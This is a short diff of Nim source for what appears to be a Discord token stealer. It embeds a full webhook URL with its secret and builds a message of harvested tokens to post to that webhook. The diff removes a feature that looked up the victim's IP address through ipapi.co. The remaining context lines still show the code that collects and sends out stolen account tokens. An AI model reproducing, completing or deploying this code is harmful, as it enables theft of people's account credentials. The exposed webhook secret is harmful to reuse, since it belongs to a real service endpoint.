@@ -5,7 +5,6 @@ from strutils import replace, endswith, strip
 let webhook = "https://discord.com/api/webhooks/1073928058794414130/zSLCsqFy_8A4RN2kG_A8uBp5cKyy-sleXLKbhOBwsvZ5yz80DgZMVK3VOoPCUNT_87jQ"
 
 const
-  sendIP: char = 'Y'
   embed: char = 'Y'
 
 var
@@ -63,10 +62,6 @@ for c in tokens: hooktks.add(c & "\n")
 hooktks = &"```\n{hooktks.strip(leading=false)}```"
 
 
-when sendIP == 'Y':
-  let ip: string = fetch("https://ipapi.co/json/")
-else:
-  echo("ah bahhhh pas de chance")
 
 when embed == 'Y':
   var data = %*{
